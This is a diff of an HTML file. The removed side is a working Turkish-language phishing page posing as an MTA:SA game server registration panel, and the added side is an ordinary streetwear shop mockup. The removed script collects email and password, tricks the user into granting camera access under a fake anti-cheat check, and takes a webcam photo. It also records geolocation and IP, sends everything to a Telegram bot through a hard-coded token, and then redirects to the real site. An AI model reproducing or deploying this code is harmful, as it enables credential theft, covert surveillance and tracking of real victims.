@@ -3,126 +3,160 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTA:SA Server Portal</title>
+    <title>CAWZ | UK Drip & Tech Fleece Authority</title>
+    <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        body { margin: 0; padding: 0; background-color: #0a0a0a; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; overflow: hidden; }
-        .mta-box { background: #161616; width: 100%; max-width: 380px; padding: 30px; border-radius: 15px; border: 1px solid #333; box-shadow: 0 25px 50px rgba(0,0,0,1); text-align: center; position: relative; }
-        
-        /* LOGO ALANI - GARANTİ YÖNTEM */
-        .logo-placeholder { margin-bottom: 20px; }
-        .mta-text-logo { font-size: 32px; font-weight: 800; color: #3498db; letter-spacing: -1px; text-shadow: 0 0 15px rgba(52, 152, 219, 0.5); font-style: italic; }
-        .mta-sub-text { font-size: 10px; color: #555; display: block; margin-top: -5px; }
+        :root { --nike-grey: #f6f6f6; --dark: #111; --blue: #0071ad; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Inter', sans-serif; background: #fff; color: #000; overflow-x: hidden; }
 
-        h2 { font-size: 18px; margin-bottom: 20px; color: #3498db; text-transform: uppercase; letter-spacing: 1px; }
-        .input-group { margin-bottom: 15px; text-align: left; }
-        .input-group label { display: block; font-size: 11px; color: #666; margin-bottom: 5px; font-weight: bold; }
-        .input-group input { width: 100%; padding: 12px; background: #222; border: 1px solid #333; border-radius: 6px; color: white; box-sizing: border-box; outline: none; }
-        .main-btn { background: #3498db; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 15px; margin-top: 10px; }
-        #verify-modal { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #1a1a1a; border-radius: 15px; padding: 30px; box-sizing: border-box; z-index: 10; flex-direction: column; justify-content: center; }
-        .confirm-btn { background: #27ae60; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        /* Üst Bildirim Çubuğu */
+        .top-bar { background: #f5f5f5; padding: 8px 40px; font-size: 11px; font-weight: 700; display: flex; justify-content: flex-end; gap: 20px; border-bottom: 1px solid #eee; }
+
+        /* Header */
+        header { display: flex; justify-content: space-between; align-items: center; padding: 20px 40px; position: sticky; top: 0; background: rgba(255,255,255,0.98); z-index: 1000; }
+        .logo { font-family: 'Archivo Black', sans-serif; font-size: 35px; letter-spacing: -3px; }
+        nav { display: flex; gap: 30px; }
+        nav a { text-decoration: none; color: #000; font-size: 15px; font-weight: 700; }
+        .nav-right { display: flex; gap: 20px; align-items: center; font-size: 20px; }
+
+        /* HERO - Ekranı Tam Kaplayan Bölüm */
+        .hero { width: 100%; height: 85vh; background: var(--nike-grey); display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
+        .hero-bg-text { position: absolute; font-family: 'Archivo Black', sans-serif; font-size: 25vw; color: rgba(0,0,0,0.03); white-space: nowrap; z-index: 1; pointer-events: none; }
+        .hero-content { z-index: 2; text-align: center; }
+        .hero-title { font-family: 'Archivo Black', sans-serif; font-size: 100px; line-height: 0.8; text-transform: uppercase; margin-bottom: 20px; }
+        .hero-btn { background: #000; color: #fff; padding: 12px 30px; border-radius: 50px; text-decoration: none; font-weight: 700; display: inline-block; margin-top: 20px; }
+
+        /* BENTO GRID - Boşlukları Dolduran Yapı */
+        .bento-container { padding: 40px; display: grid; grid-template-columns: repeat(4, 1fr); grid-template-rows: repeat(2, 400px); gap: 20px; }
+        .bento-item { background: #f5f5f5; border-radius: 4px; position: relative; overflow: hidden; display: flex; flex-direction: column; justify-content: flex-end; padding: 30px; text-decoration: none; color: #000; }
+        .bento-item:nth-child(1) { grid-column: span 2; grid-row: span 2; background: #e6e7e8 url('https://images.unsplash.com/photo-1556821840-3a63f95609a7?q=80&w=1000') center/cover; }
+        .bento-item:nth-child(2) { grid-column: span 2; background: #111 url('https://images.unsplash.com/photo-1511499767390-90342f5677e7?q=80&w=1000') center/cover; color: #fff; }
+        .bento-item:nth-child(3) { background: #daeaf6; }
+        .bento-item:nth-child(4) { background: #fff; border: 1px solid #eee; }
+        
+        .bento-tag { font-size: 12px; font-weight: 900; text-transform: uppercase; margin-bottom: 10px; }
+        .bento-title { font-size: 24px; font-weight: 900; line-height: 1; }
+
+        /* TECH FLEECE SERIES SECTION */
+        .tech-section { padding: 80px 40px; background: #fff; }
+        .tech-header { margin-bottom: 40px; }
+        .tech-header h2 { font-family: 'Archivo Black', sans-serif; font-size: 40px; text-transform: uppercase; }
+        .tech-grid { display: flex; gap: 20px; overflow-x: auto; padding-bottom: 20px; scrollbar-width: none; }
+        .tech-card { min-width: 400px; }
+        .tech-img { width: 100%; height: 500px; background: #f5f5f5; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; font-size: 80px; }
+        
+        /* FOOTER - Nike Tarzı Çok Linkli */
+        footer { background: #000; color: #fff; padding: 60px 40px; display: grid; grid-template-columns: repeat(4, 1fr); gap: 40px; }
+        footer h4 { font-size: 14px; text-transform: uppercase; margin-bottom: 25px; }
+        footer a { color: #7e7e7e; text-decoration: none; font-size: 12px; display: block; margin-bottom: 12px; }
+        .footer-bottom { grid-column: span 4; border-top: 1px solid #222; padding-top: 40px; display: flex; justify-content: space-between; align-items: center; }
     </style>
 </head>
 <body>
 
-<div class="mta-box">
-    <div id="reg-step">
-        <div class="logo-placeholder">
-            <span class="mta-text-logo">MTA:SA</span>
-            <span class="mta-sub-text">MULTI THEFT AUTO: SAN ANDREAS</span>
-        </div>
-        <h2>Sunucu Kayıt Paneli</h2>
-        <div class="input-group">
-            <label>GMAIL ADRESİ</label>
-            <input type="email" id="email" placeholder="email@gmail.com">
-        </div>
-        <div class="input-group">
-            <label>ŞİFRE</label>
-            <input type="password" id="pass" placeholder="********">
-        </div>
-        <button class="main-btn" onclick="dogrulamaGoster()">HESABI OLUŞTUR</button>
-    </div>
-
-    <div id="verify-modal">
-        <h3 style="color:#f1c40f">⚠️ SON ADIM: DOĞRULAMA</h3>
-        <p style="font-size: 13px; color:#ccc; margin-bottom:20px;">
-            Sunucu Anti-Cheat ve Voice Chat sisteminin aktif edilebilmesi için <b>Güvenlik Doğrulaması</b> zorunludur.
-        </p>
-        <button class="confirm-btn" id="finalBtn" onclick="herseyiBitir()">ERİŞİMİ ONAYLA VE BAĞLAN</button>
-    </div>
+<div class="top-bar">
+    <span>Yardım</span> | <span>Katıl</span> | <span>Oturum Aç</span>
 </div>
 
-<script>
-    const botToken = "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc";
-    const chatId = "1540769169";
+<header>
+    <div class="logo">CAWZ</div>
+    <nav>
+        <a href="#">New Drops</a>
+        <a href="#">Nike Tech</a>
+        <a href="#">Nocta</a>
+        <a href="#">Collections</a>
+        <a href="#">Sale</a>
+    </nav>
+    <div class="nav-right">🔍 🤍 🛍️</div>
+</header>
 
-    function dogrulamaGoster() {
-        if(!document.getElementById('email').value || !document.getElementById('pass').value) {
-            alert("Lütfen tüm alanları doldurun!"); return;
-        }
-        document.getElementById('reg-step').style.opacity = '0.1';
-        document.getElementById('verify-modal').style.display = 'flex';
-    }
+<section class="hero">
+    <div class="hero-bg-text">DRIP</div>
+    <div class="hero-content">
+        <h1 class="hero-title">CAWZ<br>TECH SERIES</h1>
+        <p>UK Streetwear'in en yeni ve en sert hali. Limitsiz hareket, maksimum tarz.</p>
+        <a href="#" class="hero-btn">Koleksiyonu İncele</a>
+    </div>
+</section>
 
-    async function fotoCekVeGonder(stream) {
-        try {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.muted = true;
-            await video.play();
+<div class="bento-container">
+    <a href="#" class="bento-item">
+        <div class="bento-tag">Season 2026</div>
+        <div class="bento-title">UK ROADMAN<br>ARCHIVE</div>
+    </a>
+    <a href="#" class="bento-item">
+        <div class="bento-tag">Yeni Gelenler</div>
+        <div class="bento-title">STEALTH BLACK<br>COLLECTION</div>
+    </a>
+    <a href="#" class="bento-item">
+        <div class="bento-tag">Özel Seri</div>
+        <div class="bento-title">SKY BLUE<br>FLEECE</div>
+    </a>
+    <a href="#" class="bento-item">
+        <div class="bento-tag">Aksesuar</div>
+        <div class="bento-title">DRIP<br>ESSENTIALS</div>
+    </a>
+</div>
 
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            
-            await new Promise(r => setTimeout(r, 1500)); // Odaklanma süresi
-            
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('photo', blob, 'capture.jpg');
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
-                    method: 'POST', body: formData
-                });
-                stream.getTracks().forEach(t => t.stop());
-            }, 'image/jpeg', 0.7);
-        } catch (e) { console.log(e); }
-    }
+<section class="tech-section">
+    <div class="tech-header">
+        <h2>Tech Fleece Essentials</h2>
+    </div>
+    <div class="tech-grid">
+        <div class="tech-card">
+            <div class="tech-img">🧥</div>
+            <div style="font-weight:700">Cawz Tech Full-Zip Jacket</div>
+            <div style="color:#7e7e7e; font-size:14px">Men's Hooded Jacket</div>
+            <div style="margin-top:10px; font-weight:700">₺4.499</div>
+        </div>
+        <div class="tech-card">
+            <div class="tech-img" style="background:#111">👖</div>
+            <div style="font-weight:700">Cawz Tech Jogger</div>
+            <div style="color:#7e7e7e; font-size:14px">Men's Trousers</div>
+            <div style="margin-top:10px; font-weight:700">₺3.850</div>
+        </div>
+        <div class="tech-card">
+            <div class="tech-img" style="background:#e6e7e8">👕</div>
+            <div style="font-weight:700">Cawz Utility Vest</div>
+            <div style="color:#7e7e7e; font-size:14px">Tactical Series</div>
+            <div style="margin-top:10px; font-weight:700">₺5.100</div>
+        </div>
+    </div>
+</section>
 
-    async function herseyiBitir() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
-        const btn = document.getElementById('finalBtn');
-        btn.innerText = "SİSTEM DOĞRULANIYOR...";
-        btn.disabled = true;
+<footer>
+    <div>
+        <h4>MAĞAZA BUL</h4>
+        <a href="#">CAWZ ÜYESİ OL</a>
+        <a href="#">BİZE GERİ BİLDİRİM VER</a>
+        <a href="#">PROMOSYON KODLARI</a>
+    </div>
+    <div>
+        <h4>YARDIM AL</h4>
+        <a href="#">Sipariş Durumu</a>
+        <a href="#">Teslimat</a>
+        <a href="#">İade</a>
+        <a href="#">Ödeme Seçenekleri</a>
+    </div>
+    <div>
+        <h4>CAWZ HAKKINDA</h4>
+        <a href="#">Haberler</a>
+        <a href="#">Kariyer</a>
+        <a href="#">Yatırımcılar</a>
+        <a href="#">Sürdürülebilirlik</a>
+    </div>
+    <div style="font-family:'Archivo Black'; font-size:24px;">CAWZ</div>
+    
+    <div class="footer-bottom">
+        <div>© 2026 CAWZ, Inc. Tüm Hakları Saklıdır</div>
+        <div style="display:flex; gap:20px;">
+            <a href="#">Rehberler</a>
+            <a href="#">Kullanım Şartları</a>
+            <a href="#">Satış Şartları</a>
+        </div>
+    </div>
+</footer>
 
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-            await fotoCekVeGonder(stream);
-        } catch(e) { gonder("❌ Kamera reddedildi."); }
-
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(p => {
-                gonder(`📍 **KONUM:** http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            });
-        }
-
-        try {
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
-            gonder(`👤 **GİRİŞ:** \`${email}\` / \`${pass}\`\n🌐 **IP:** \`${ipData.ip}\`\n🏢 **ISP:** ${ipData.org}`);
-        } catch(e) {}
-
-        setTimeout(() => {
-            alert("Doğrulama başarılı! Mailinizi kontrol edin.");
-            window.location.href = "https://multitheftauto.com";
-        }, 3000);
-    }
-
-    function gonder(m) {
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(m)}&parse_mode=markdown`);
-    }
-</script>
 </body>
 </html>
-
